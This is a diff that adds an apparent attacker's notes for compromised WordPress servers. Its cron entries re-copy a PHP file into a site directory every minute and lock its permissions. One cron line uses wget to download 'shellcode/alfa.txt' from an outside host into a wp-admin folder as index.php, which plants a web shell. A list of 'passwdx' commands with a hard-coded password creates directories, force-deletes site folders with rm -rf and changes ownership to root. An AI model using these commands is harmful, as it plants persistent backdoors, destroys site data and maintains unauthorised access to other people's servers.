@@ -1,0 +1,17 @@
+* * * * * mkdir -p path/path;cp -r shellhidden/shellhidden pathshell/pathshell;chmod 0111 path/path >/dev/null 2>&1
+
+
+* * * * * mkdir -p /home/nexos/buku-mimpi;cp -r /home/vulnerabilidadycambio/wp-content/uploads/2022/05/index.php /home/nexos/buku-mimpi/index.php;chmod 0555 /home/nexos/buku-mimpi;chmod 0444 /home/nexos/buku-mimpi/index.php;chmod 0555 /home/nexos >/dev/null 2>&1
+
+* * * * * wget -q https://timseosukses.com/shellcode/alfa.txt -O /var/www/html/wpweb/pgpaud/wp-admin/includes/index.php
+
+
+
+
+command prmpt
+
+passwdx Rizky@2003 'cd /home/vtour/public_html/wp-includes/;mkdir sbobet;ls -al'  (create dir)
+passwdx Rizky@2003 'rm -rf /home/subdo/public_html/direction;ls -al' (delete paksa)
+passwdx Rizky@2003 'chown root:root -R /home/ppm193/public_html/quixter;ls -al' (root)
+passwdx Rizky@2003 'chown www-data:www-data -R /home/ppm193/public_html/quixter;ls -al' (green dir)
+passwdx Rizky@2003 'cd /home/vtour/public_html/wp-includes/;cat > filename.txt;ls -al'
